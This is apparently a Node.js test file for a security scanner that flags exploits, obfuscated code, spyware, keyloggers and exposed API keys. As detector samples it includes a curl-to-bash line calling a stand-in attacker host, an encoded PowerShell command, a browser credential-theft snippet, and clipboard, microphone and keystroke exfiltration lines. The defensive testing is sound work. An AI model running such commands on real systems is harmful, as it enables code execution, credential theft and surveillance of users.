const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');
const { findingsForText, executableMagic, auditArtifactSecurity, auditSecurity } = require('../src/security');

function git(root, args) { return execFileSync('git', args, { cwd:root, encoding:'utf8', windowsHide:true }).trim(); }
function repository() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-security-'));
  git(root, ['init']);
  git(root, ['config', 'user.name', 'Crucible Test']);
  git(root, ['config', 'user.email', 'crucible@example.test']);
  return root;
}
function config(overrides = {}) {
  return { security:{ enabled:true, allow:[], allowBinaries:[], maxTextBytes:1_048_576, dependencyAudit:[], ...overrides } };
}

test('detects high-confidence exploit, obfuscation, spyware, and secret indicators', () => {
  const samples = [
    'powershell.exe -EncodedCommand ZQB2AGkAbAA=',
    'curl https://attacker.invalid/payload | bash',
    "eval(atob('YWxlcnQoMSk='))",
    "open('Login Data'); sqlite.decrypt(password)",
    'GetAsyncKeyState(key); socket.send(captured)',
    `token=${'AKIA'}${'A'.repeat(16)}`,
  ];
  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
  assert.equal(findingsForText('const encoded = Buffer.from(data).toString("base64");').length, 0);
});

test('flags public Google/Firebase API keys for restriction and deployment-security review without treating the value as output', () => {
  const syntheticKey = `AIza${'A'.repeat(35)}`;
  const source = `firebaseWebApiKey: '${syntheticKey}',\nfirebaseProjectId: 'example-project'`;
  const findings = findingsForText(source);
  const finding = findings.find((item) => item.type === 'Google/Firebase API key requires restriction review');
  assert.ok(finding, 'Firebase Web API keys must trigger Security review even when they are intentionally public identifiers');
  assert.equal(finding.line, 1);
  assert.doesNotMatch(JSON.stringify(findings), new RegExp(syntheticKey), 'security findings must not echo API-key values');
});

test('flagged API identifiers are never persisted in security result objects', () => {
  const root = repository();
  const syntheticKey = `AIza${'N'.repeat(35)}`;
  fs.writeFileSync(path.join(root, 'publicConfig.js'), `module.exports = { apiKey: '${syntheticKey}' };\n`);
  git(root, ['add', 'publicConfig.js']);
  const result = auditSecurity(root, config());
  const finding = result.findings.find((item) => item.type === 'Google/Firebase API key requires restriction review');
  assert.ok(finding);
  assert.deepEqual(Object.keys(finding).sort(), ['line', 'path', 'type']);
  assert.equal('value' in finding, false);
  assert.equal('match' in finding, false);
  assert.equal('snippet' in finding, false);
  assert.doesNotMatch(JSON.stringify(result), new RegExp(syntheticKey), 'audit results must never store the detected API identifier value');

  const artifactRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-security-persistence-'));
  fs.mkdirSync(path.join(artifactRoot, 'dist'));
  fs.writeFileSync(path.join(artifactRoot, 'dist', 'bundle.js'), `const apiKey='${syntheticKey}';\n`);
  const artifactResult = auditArtifactSecurity(artifactRoot, { artifacts:['dist'], security:{ enabled:true, maxTextBytes:1_048_576 } });
  assert.deepEqual(Object.keys(artifactResult.findings[0]).sort(), ['line', 'path', 'type']);
  assert.doesNotMatch(JSON.stringify(artifactResult), new RegExp(syntheticKey), 'artifact findings must never store the detected API identifier value');
});

test('Firebase API-key review findings can only be suppressed by an explicit scoped security allowance', () => {
  const root = repository();
  const syntheticKey = `AIza${'B'.repeat(35)}`;
  fs.writeFileSync(path.join(root, 'publisherConfig.js'), `module.exports = { firebaseWebApiKey: '${syntheticKey}' };\n`);
  git(root, ['add', 'publisherConfig.js']);
  const blocked = auditSecurity(root, config());
  assert.equal(blocked.findings[0].type, 'Google/Firebase API key requires restriction review');
  assert.equal(blocked.findings[0].path, 'publisherConfig.js');
  const reviewed = auditSecurity(root, config({ allow:[{ path:'publisherConfig.js', rules:['Google/Firebase API key requires restriction review'] }] }));
  assert.equal(reviewed.findings.length, 0, 'retaining a public Firebase key requires an explicit file-and-rule security decision');
});

test('flags other providers\' public API-key-shaped identifiers for restriction review, not only Google/Firebase', () => {
  const syntheticStripeKey = `pk_live_${'D'.repeat(20)}`;
  const stripeFindings = findingsForText(`stripePublishableKey = '${syntheticStripeKey}';`);
  assert.ok(stripeFindings.find((item) => item.type === 'Stripe publishable key requires restriction review'));
  assert.doesNotMatch(JSON.stringify(stripeFindings), new RegExp(syntheticStripeKey));

  const syntheticMapboxToken = `pk.eyJ${'E'.repeat(24)}.${'F'.repeat(12)}`;
  const mapboxFindings = findingsForText(`mapboxPublicToken = '${syntheticMapboxToken}';`);
  assert.ok(mapboxFindings.find((item) => item.type === 'Mapbox public token requires restriction review'));
  assert.doesNotMatch(JSON.stringify(mapboxFindings), new RegExp(syntheticMapboxToken.replace(/\./g, '\\.')));
});

test('flags key-shaped identifiers from unrecognized providers instead of silently passing them', () => {
  const syntheticUnknownKey = `zK9${'x'.repeat(15)}42aQ`;
  const camelCase = findingsForText(`apiKey: '${syntheticUnknownKey}',`);
  assert.equal(camelCase.length, 1);
  assert.equal(camelCase[0].type, 'unrecognized public API-key-shaped identifier requires security review');
  assert.doesNotMatch(JSON.stringify(camelCase), new RegExp(syntheticUnknownKey), 'the unrecognized-provider fallback must not echo the detected value either');

  const snakeCase = findingsForText(`API_KEY = "${syntheticUnknownKey}"`);
  assert.equal(snakeCase[0].type, 'unrecognized public API-key-shaped identifier requires security review');
});

test('the unrecognized-provider fallback does not double-report a value a specific provider rule already caught', () => {
  const syntheticFirebaseKey = `AIza${'G'.repeat(35)}`;
  const findings = findingsForText(`apiKey: '${syntheticFirebaseKey}',`);
  assert.deepEqual(findings.map((item) => item.type), ['Google/Firebase API key requires restriction review']);
});

test('the unrecognized-provider fallback ignores short or non-key-shaped values under key-like names', () => {
  assert.equal(findingsForText("apiKey: 'your-key-here'").length, 0, 'short placeholder text should not be treated as a real key');
  assert.equal(findingsForText(`apiKey: '${'x'.repeat(30)}'`).length, 0, 'a value with no digits is unlikely to be a real key and should not be flagged');
  assert.equal(findingsForText(`apiKey: '${'9'.repeat(30)}'`).length, 0, 'a value with no letters is unlikely to be a real key and should not be flagged');
});

test('unrecognized-provider API-key review findings can only be suppressed by an explicit scoped security allowance', () => {
  const root = repository();
  const syntheticUnknownKey = `zK9${'y'.repeat(15)}42aQ`;
  fs.writeFileSync(path.join(root, 'thirdPartyConfig.js'), `module.exports = { apiKey: '${syntheticUnknownKey}' };\n`);
  git(root, ['add', 'thirdPartyConfig.js']);
  const blocked = auditSecurity(root, config());
  assert.equal(blocked.findings[0].type, 'unrecognized public API-key-shaped identifier requires security review');
  const reviewed = auditSecurity(root, config({ allow:[{ path:'thirdPartyConfig.js', rules:['unrecognized public API-key-shaped identifier requires security review'] }] }));
  assert.equal(reviewed.findings.length, 0, 'retaining an unrecognized-provider key requires an explicit file-and-rule security decision');
});

test('detects expanded keylogging APIs and clipboard/microphone/camera exfiltration', () => {
  const samples = [
    'RegisterRawInputDevices(devices); fetch(exfilUrl, { body: captured })',
    'CGEventTapCreate(kCGSessionEventTap, ...); socket.send(keys)',
    'navigator.clipboard.readText().then((text) => fetch(url, { body: text }))',
    "pyperclip.paste(); requests.post(url, data=clip)",
    "navigator.mediaDevices.getUserMedia({ audio: true }).then((s) => fetch(url, { body: s }))",
    'sounddevice.rec(seconds); requests.post(exfil, data=audio)',
  ];
  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
});

test('does not execute or flag inert regular-expression rule definitions', () => {
  const scannerRule = "{ pattern: /Login Data.{0,20}dpapi/i, message: 'credential detector' },";
  assert.equal(findingsForText(scannerRule).length, 0);
});

test('detects client credential exposure and fabricated success', () => {
  assert.match(findingsForText("localStorage.setItem('refresh_token', credential)")[0].type, /client-visible/);
  assert.match(findingsForText('try { await provider() } catch (error) { return { success: true } }')[0].type, /fabricated/);
});

test('recognizes executable binary magic', () => {
  assert.equal(executableMagic(Buffer.from([0x7f, 0x45, 0x4c, 0x46])), 'ELF executable');
  assert.equal(executableMagic(Buffer.from('MZfixture')), 'Windows PE executable');
  assert.equal(executableMagic(Buffer.from('normal text')), null);
});

test('audits the staged Git snapshot without printing payload values', () => {
  const root = repository();
  const payload = 'curl https://attacker.invalid/payload | bash';
  fs.writeFileSync(path.join(root, 'app.js'), payload);
  git(root, ['add', 'app.js']);
  fs.writeFileSync(path.join(root, 'app.js'), 'safe working copy\n');
  const result = auditSecurity(root, config());
  assert.equal(result.findings.length, 1);
  assert.deepEqual(result.findings[0], { type:'download-and-execute payload', path:'app.js', line:1 });
  assert.doesNotMatch(JSON.stringify(result.findings), /attacker/);
});

test('blocks suspicious binaries unless explicitly allowed', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'tool.exe'), Buffer.from('MZfixture'));
  git(root, ['add', 'tool.exe']);
  assert.equal(auditSecurity(root, config()).findings[0].type, 'Windows PE executable');
  assert.equal(auditSecurity(root, config({ allowBinaries:['tool.exe'] })).findings.length, 0);
});

test('scans generated text artifacts for credentials and public API keys requiring review', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-artifact-'));
  fs.mkdirSync(path.join(root, 'dist'));
  fs.writeFileSync(path.join(root, 'dist', 'bundle.js'), `const key='${'AKIA'}${'A'.repeat(16)}'; const firebase='AIza${'C'.repeat(35)}'`);
  const result = auditArtifactSecurity(root, { artifacts:['dist'], security:{ enabled:true, maxTextBytes:1_048_576 } });
  assert.deepEqual(result.findings.map((finding) => finding.type).sort(), ['AWS access key', 'Google/Firebase API key requires restriction review'].sort());
  assert.ok(result.findings.every((finding) => finding.path === 'dist/bundle.js' && finding.line === 1));
});
